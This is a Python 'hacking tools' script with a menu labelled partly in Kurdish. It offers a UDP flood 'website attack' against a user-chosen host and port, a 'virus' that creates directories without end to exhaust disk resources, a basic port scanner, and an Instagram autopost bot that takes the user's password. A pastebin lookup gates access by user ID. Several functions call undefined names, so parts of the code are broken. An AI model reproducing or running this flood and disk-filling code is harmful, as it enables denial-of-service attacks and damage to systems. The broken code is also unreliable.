


from colorama import *
import os
import requests
import uuid
import time 
logo = Fore.YELLOW + """



          PUNJABI
               

		     """
def toolshack():
    def ddos():
        import sys
        import os
        import time
        import socket
        import random
        os.system("cls")
        print (logo)
        print(Fore.RESET)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
    
        
        host = input(Fore.RED + "name Target : ")
        ip = socket.gethostbyname(host)
        port = input(Fore.CYAN + "Port       : ")
        s = int(port)
        os.system("cls")
        print ("")
        
    
    
        print (Fore.RED + "[                    ] 0% ")
        time.sleep(2)
        print (Fore.YELLOW + "[=====               ] 25%")
        time.sleep(2)
        print (Fore.GREEN + "[==========          ] 50%")
        time.sleep(2)
        print (Fore.BLUE + "[===============     ] 75%")
        time.sleep(2)
        print (Fore.LIGHTBLUE_EX + "[====================] 100%")
        time.sleep(2)
        sent = 0
        print(Fore.RESET)
    
        while True:
            sock.sendto(bytes, (ip,s))
            sent = sent + 1
            port = s + 1
            print (Fore.RED + "Sent %s packet to %s throught port:%s"%(sent,ip,port))
        if port == 65534:
            port = 1
    
    
    def virus():
    	import os
    	s=1
    	h=10000000000000000000000000000000000000000000
    
    
    	while s < h:
    		s+=1
    		aram=str(s)
    		os.mkdir(aram)
        
    def portscanner():
    	print(logo)
    	import socket
    	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	print("")
    	target = input (Back.GREEN + Fore.RED + "[+] IP dane: " + Style.RESET_ALL)
    	print(Style.RESET_ALL)
    
    	def scanner(port):
    		try:
    			sock.connect((target,port))
    			return True
    		except:
    			return False
    	
    	for portNumber in range(70,100):
    		print(Fore.YELLOW + "== wa scanne port dakat", Fore.RED, portNumber)
    		if scanner(portNumber):
    			print(Fore.YELLOW + "[+] port ", Fore.GREEN, portNumber, Fore.YELLOW + "/tcp","krawaya")
    			Fore.RESET
    
    def igpost():
        import os
        os.system("pip install instabot")
        from instabot import Bot
        import time
        os.system("pip install colorama") 
        from colorama import Fore, Back, Style
        #=================== Design Start ===============
        os.system('cls')
        print (logo)
        # ================== Design Finish =====================
        email=input(Fore.LIGHTGREEN_EX + 'username instakat dane: ')
        passkat=input(Fore.LIGHTGREEN_EX + 'password kat dane ba shaq: ')
        s=input(Fore.LIGHTGREEN_EX + 'chand post bkat bot: ')
        print(Fore.RESET)
        d="10000"
        j=100
        g=int(s)
        bot=Bot()
        while s > d:
            if g > j :
                print(binary)
                print(" ")
                print(" ")            
                print('                 { Bbwra zyatr la 100 post xrap block abit } ')
                print(" ")
                print(" ")
                time.sleep(5)
                os.system('cls')
                break
                
            
            s+='1' 
            bot.login(username=email,password=passkat)
            bot.upload_photo("aram.jpeg",caption="post by aram add my snapchat aram.logic")
            os.rename("autom.jpeg.REMOVE_ME","aram.jpeg")
    
    
    
    os.system("cls")
    toolakan = Fore.GREEN + """
    
         ############################################
    	 # [1] website attack                       #
    	 # [2] virus (agadar ba boxot bakare nahene)#
    	 # [3] port checker                         #
         # [4] instagram autopost                   #
    	 ############################################
    	 """
    print (logo)
    print (toolakan)
    
    choice = input(Fore.YELLOW + "KurdTech| ")
    
    if choice == "1":
    	ddos()
    if choice == "2":
    	virus()
    if choice == "3":
    	portscanner()
    if choice == "4":
        igpost()
os.system("clear")
def baha():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    print("\x1b[37;1mYour ID : "+id)
    try:
        httpCaht = requests.get("https://pastebin.com/2WuEPjdc").text
        if id in httpCaht:
            print("\x1b[37;1mYOUR ID IS ACTIVE.........")
            msg = str(os.geteuid())
            time.sleep(1)
            danyar()
            
        else:
            print("\x1b[37;1mYOUR ID IS NOT ACTIVE.........")
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()

    if name == '__main__':
        baha()

os.system('xdg-open https://www.instagram.com/ara_software/')
os.system('clear')





baha()


            
danyar()

    
    
    
